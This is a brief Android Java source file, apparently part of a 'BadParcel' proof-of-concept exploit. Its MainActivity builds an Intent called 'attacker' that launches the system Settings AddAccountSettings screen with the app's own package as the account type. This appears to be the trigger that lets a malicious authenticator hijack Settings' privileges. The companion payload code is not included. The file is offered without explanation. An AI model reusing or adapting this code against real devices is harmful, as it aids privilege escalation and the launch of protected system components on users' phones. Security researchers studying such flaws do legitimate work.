package com.example.badparcel;

import android.app.Activity;
import android.content.ComponentName;
import android.content.Intent;
import android.os.Bundle;

public class MainActivity extends Activity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        Intent attacker = new Intent();
        attacker.setComponent(new ComponentName("com.android.settings", "com.android.settings.accounts.AddAccountSettings"));
        attacker.setAction(Intent.ACTION_RUN);
        attacker.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        String[] authTypes = {getPackageName()};
        attacker.putExtra("account_types", authTypes);
        startActivity(attacker);
        finish();
    }

}